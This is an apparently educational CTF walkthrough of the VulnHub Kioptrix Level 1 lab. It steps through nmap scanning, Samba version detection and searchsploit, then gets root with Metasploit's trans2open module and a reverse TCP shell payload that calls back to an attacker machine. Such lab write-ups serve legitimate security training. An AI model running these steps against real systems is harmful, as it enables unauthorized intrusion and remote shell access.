<h1 align="center">🐧 Kioptrix Level 1 — Penetration Testing Walkthrough</h1>
<h3 align="center">Boot to Root</h3>

<p align="center">
  <img src="https://img.shields.io/badge/Penetration-Testing-red" alt="Pentest">
  <img src="https://img.shields.io/badge/Difficulty-Intermediate-orange" alt="Difficulty">
  <img src="https://img.shields.io/badge/Category-CTF-blue" alt="CTF">
  <img src="https://img.shields.io/badge/Status-Completed-green" alt="Completed">
  <img src="https://img.shields.io/badge/Platform-VulnHub-purple" alt="Platform">
</p>

---

## 📖 Table of Contents
- [Overview](#-overview)
- [Objectives](#-objectives)
- [1. Reconnaissance](#1-reconnaissance)
- [2. Enumeration](#2-enumeration)
- [3. Exploitation & Privilege Escalation](#3-exploitation--privilege-escalation)
- [Tools Used](#-tools-used)

---

## 📋 Overview
This guide documents the complete penetration testing methodology for **Kioptrix Level 1**, detailing every step from initial reconnaissance to privilege escalation and root access. *(Note: there's no literal "flag" file on this machine — the goal is simply to become root.)*

## 🎯 Objectives
- Identify the target system and open services
- Enumerate users and services
- Exploit vulnerabilities to gain initial access
- Escalate privileges to obtain root access
- Capture the "flag" (i.e. become root)

---

## 1. Reconnaissance

### 🔎 Network Discovery
Check the IP allocated to the attacking machine and determine the subnet range.

```bash
$ ifconfig
```

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Kioptrix-Level-1-Walkthrough/main/Screenshots/IFCONFIG.PNG" alt="ifconfig output" width="600"/>
</p>

### 🌐 Host Discovery
Ping sweep to identify live hosts within the subnet.

```bash
$ nmap -sn 192.168.56.1/24
```

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Kioptrix-Level-1-Walkthrough/main/Screenshots/Hostdiscovery.PNG" alt="Nmap host discovery" width="600"/>
</p>

### 🛰️ Port Scan
Scan all ports. The `-A` flag enables aggressive mode, bundling OS and service detection.

```bash
$ nmap -p- -A 192.168.56.110
```

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Kioptrix-Level-1-Walkthrough/main/Screenshots/nmap.PNG" alt="Nmap port scan results" width="600"/>
</p>

**Findings:**

| Port | Service |
|------|---------|
| 22 | SSH |
| 80 | HTTP |
| 111 | RPC |
| 139 | SMB |
| 443 | HTTPS |
| 32768 | RPC |

---

## 2. Enumeration

### 🌍 Web Ports
Navigating to port 80 (`http://192.168.56.110:80`) shows a test page with nothing meaningful.

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Kioptrix-Level-1-Walkthrough/main/Screenshots/http80.PNG" alt="Port 80 test page" width="600"/>
</p>

Navigating to port 443 (`https://192.168.56.110:443`) returns a bad request.

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Kioptrix-Level-1-Walkthrough/main/Screenshots/http443.PNG" alt="Port 443 bad request" width="600"/>
</p>

### 📡 SMB Enumeration
`enum4linux` doesn't return the SMB version, so we pivot to the **Metasploit Framework** instead.

```bash
msf > search smb version detection
msf > use 0
msf > show options
msf > set RHOST 192.168.56.110
msf > run
msf > exit
```

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Kioptrix-Level-1-Walkthrough/main/Screenshots/Msf1.PNG" alt="Metasploit SMB version detection" width="600"/>
</p>

The scan reveals the SMB version: **Samba 2.2.1a**

We then use **searchsploit** (Kali's local exploit database) to look for known vulnerabilities:

```bash
$ searchsploit samba 2.2
```

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Kioptrix-Level-1-Walkthrough/main/Screenshots/searchsploit.PNG" alt="searchsploit results" width="600"/>
</p>

This turns up the **trans2open overflow** exploit.

---

## 3. Exploitation & Privilege Escalation

Back into the **Metasploit Framework**:

```bash
msf > search trans2open
```

Multiple modules appear — we select the **Linux** variant, since the earlier scan showed the target running Red Hat Linux.

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Kioptrix-Level-1-Walkthrough/main/Screenshots/Msf2.PNG" alt="trans2open module search" width="600"/>
</p>

```bash
msf > use 1
msf > show options
msf > set RHOST 192.168.56.110
msf > set LHOST 192.168.56.15
msf > set payload generic/reverse_shell_tcp
msf > run
```

| Setting | Value | Notes |
|---------|-------|-------|
| `RHOST` | `192.168.56.110` | Kioptrix Level 1 target |
| `LHOST` | `192.168.56.15` | Attacker machine (Kali) |
| `payload` | `generic/reverse_shell_tcp` | Fits smaller memory buffers than the default payload |

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Kioptrix-Level-1-Walkthrough/main/Screenshots/Msf3.PNG" alt="Successful exploitation via trans2open" width="600"/>
</p>

```bash
$ whoami
root
```

🎉 **Root access achieved!**

> **Note:** There are other paths to root on this box, including the classic `Open2Fuckv2.c` exploit.

---

## 🔧 Tools Used

**🛡️ Network & Service Discovery**
`ifconfig` · `nmap`

**🔓 Exploitation**
Metasploit Framework

**🔍 Information Gathering**
`searchsploit` · Metasploit `search` module

**💻 System Tools**
`bash` · `sudo`

---

<p align="center">
  <strong>Documentation created for educational purposes</strong><br>
  All techniques should be practiced only in controlled, authorized environments.
</p>
